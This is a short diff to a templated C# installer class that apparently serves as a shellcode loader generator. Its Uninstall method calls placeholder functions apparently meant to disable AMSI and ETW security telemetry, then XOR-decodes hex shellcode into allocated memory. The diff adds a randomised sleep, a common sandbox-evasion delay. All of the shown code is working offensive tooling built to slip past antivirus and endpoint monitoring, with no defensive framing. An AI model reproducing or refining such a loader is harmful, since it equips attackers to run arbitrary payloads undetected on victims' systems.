@@ -56,8 +56,9 @@ namespace {{ v.namespace }} {
         public override void Uninstall(System.Collections.IDictionary state) {
             {{ v.fn_amsi }}();
             {{ v.fn_etw }}();
+            Thread.Sleep(2000 + new Random().Next(3000));
 
-            byte[] sc = {{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
+            byte[] sc ={{ v.fn_xor }}({{ v.fn_hex }}("{{ shellcode_hex }}"),
                                        {{ v.fn_hex }}("{{ key_hex }}"));
             IntPtr mem = {{ v.fn_valloc }}(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x04);
             Marshal.Copy(sc, 0, mem, sc.Length);
